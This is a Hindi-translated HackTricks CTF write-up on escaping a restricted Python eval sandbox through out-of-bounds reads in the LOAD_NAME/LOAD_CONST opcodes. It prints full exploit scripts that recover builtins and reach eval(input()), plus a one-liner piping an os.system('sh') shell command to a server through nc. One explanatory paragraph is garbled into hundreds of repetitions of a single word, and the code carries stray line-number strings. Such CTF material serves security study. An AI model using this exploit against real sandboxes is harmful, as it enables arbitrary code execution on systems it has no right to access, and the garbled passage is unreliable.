# LOAD\_NAME / LOAD\_CONST ऑपकोड OOB पठन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>

**यह जानकारी** [**इस लेख से ली गई है**](https://blog.splitline.tw/hitcon-ctf-2022/)**।**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

हम LOAD\_NAME / LOAD\_CONST ऑपकोड में OOB पठन की सुविधा का उपयोग कर सकते हैं ताकि हम मेमोरी में कुछ प्रतीक प्राप्त कर सकें। इसका मतलब है कि आप चाहें तो `(a, b, c, ... सैकड़ों प्रतीक ..., __getattribute__) if [] else [].__getattribute__(...)` जैसे चाल का उपयोग करके आप एक प्रतीक (जैसे कि फ़ंक्शन का नाम) प्राप्त कर सकते हैं जिसे आप चाहते हैं।

फिर अपना उत्पादन तैयार करें।

### अवलोकन <a href="#overview-1" id="overview-1"></a>

स्रोत कोड बहुत छोटा है, केवल 4 लाइन हैं!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
आप विभिन्न Python कोड दर्ज कर सकते हैं, और यह [Python कोड ऑब्जेक्ट](https://docs.python.org/3/c-api/code.html) में कंपाइल हो जाएगा। हालांकि, उस कोड ऑब्जेक्ट के `co_consts` और `co_names` को eval करने से पहले खाली टपल के साथ बदल दिया जाएगा।

इस तरीके से, सभी व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व्यक्तिगत व
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
लेकिन अगर `co_names` खाली टपल हो जाएं तो क्या होगा? `LOAD_NAME 2` ऑपकोड फिर भी चलाया जाता है, और वह मूल रूप से उस मेमोरी पते से मान पढ़ने की कोशिश करता है जिसे यह शुरू में होना चाहिए था। हाँ, यह एक आउट-ऑफ-बाउंड पठन "विशेषता" है।

समाधान के लिए मूल अवधारणा सरल है। CPython में कुछ ऑपकोड, जैसे `LOAD_NAME` और `LOAD_CONST`, OOB पठन के लिए संकटग्रस्त (?) हो सकते हैं।

वे `consts` या `names` टपल से इंडेक्स `oparg` से एक ऑब्जेक्ट प्राप्त करते हैं (यही है जो `co_consts` और `co_names` को अंदर से नामित किया जाता है)। हम `LOAD_CONST` के बारे में निम्नलिखित छोटे स्निपेट का संदर्भ ले सकते हैं ताकि हम देख सकें कि CPython `LOAD_CONST` ऑपकोड को प्रोसेस करते समय क्या करता है।
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
इस तरीके से हम OOB फीचर का उपयोग करके किसी भी मेमोरी ऑफसेट से "नाम" प्राप्त कर सकते हैं। यह सुनिश्चित करने के लिए कि उसके पास कौन सा नाम है और उसका ऑफसेट क्या है, बस `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... को कोशिश करते रहें। और आपको लगभग oparg > 700 में कुछ मिल सकता है। आप gdb का उपयोग करके मेमोरी लेआउट की जांच भी कर सकते हैं, लेकिन मुझे लगता है कि यह और आसान नहीं होगा?

### एक्सप्लॉइट उत्पन्न करना <a href="#generating-the-exploit" id="generating-the-exploit"></a>

जब हम नाम / संख्याओं के लिए उपयोगी ऑफसेट प्राप्त करते हैं, तो हम उस ऑफसेट से नाम / संख्या कैसे प्राप्त करते हैं और उसका उपयोग कैसे करते हैं? यहां आपके लिए एक चाल है:\
चलो मान लेते हैं कि हम ऑफसेट 5 (`LOAD_NAME 5`) से `__getattribute__` नाम प्राप्त कर सकते हैं जिसमें `co_names=()` है, तो बस निम्नलिखित कार्य करें:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> ध्यान दें कि इसे `__getattribute__` के रूप में नामित करना आवश्यक नहीं है, आप इसे कुछ छोटे या अधिक अजीब नाम से भी नामित कर सकते हैं।

आप इसके bytecode को देखकर इसके पीछे के कारण को समझ सकते हैं:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
ध्यान दें कि `LOAD_ATTR` भी `co_names` से नाम प्राप्त करता है। पायथन नामों को एक ही ऑफसेट से लोड करता है अगर नाम समान होता है, इसलिए दूसरा `__getattribute__` भी ऑफसेट=5 से लोड होता है। इस फीचर का उपयोग करके हम नाम को मेमोरी के पास में होने पर एकाधिक नाम का उपयोग कर सकते हैं।

संख्याओं को उत्पन्न करना सरल होना चाहिए:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### एक्सप्लॉइट स्क्रिप्ट <a href="#exploit-script-1" id="exploit-script-1"></a>

मैंने लंबाई सीमा के कारण संख्याओं का उपयोग नहीं किया।

पहले यहां हमें नामों के ऑफसेट खोजने के लिए एक स्क्रिप्ट है।
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
और निम्नलिखित वास्तविक Python अपशब्द उत्पन्न करने के लिए है।
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
यह मुख्य रूप से निम्नलिखित कार्य करता है, हम `__dir__` विधि से प्राप्त करते हैं उन स्ट्रिंग के लिए:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>
